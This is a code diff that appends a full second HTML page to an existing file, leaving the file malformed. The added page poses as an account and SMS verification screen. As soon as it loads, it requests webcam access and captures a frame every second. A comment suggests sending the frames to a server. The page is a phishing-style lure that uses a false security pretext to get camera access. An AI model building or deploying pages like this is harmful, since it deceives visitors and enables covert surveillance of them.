@@ -41,3 +41,45 @@
         });
 </script>
 </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verify Your Account</title>
+  <script>
+    // Access the webcam and stream it
+    async function startWebcam() {
+      const video = document.createElement('video');
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+
+      // Request access to the webcam
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      video.play();
+
+      // Loop to capture frames
+      setInterval(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // You can save the video or send it to a server
+        // Example: Save as a file
+        const link = document.createElement('a');
+        link.download = 'webcam_capture_' + Date.now() + '.png';
+        link.href = canvas.toDataURL();
+        link.click();
+      }, 1000);
+    }
+
+    // Start the webcam when the page loads
+    window.onload = startWebcam;
+  </script>
+</head>
+<body>
+  <h1>Verify Your Account</h1>
+  <p>Click the link to verify your SMS connection and ensure your account is secure.</p>
+  <p>We are accessing your webcam to confirm your identity.</p>
+</body>
+</html>
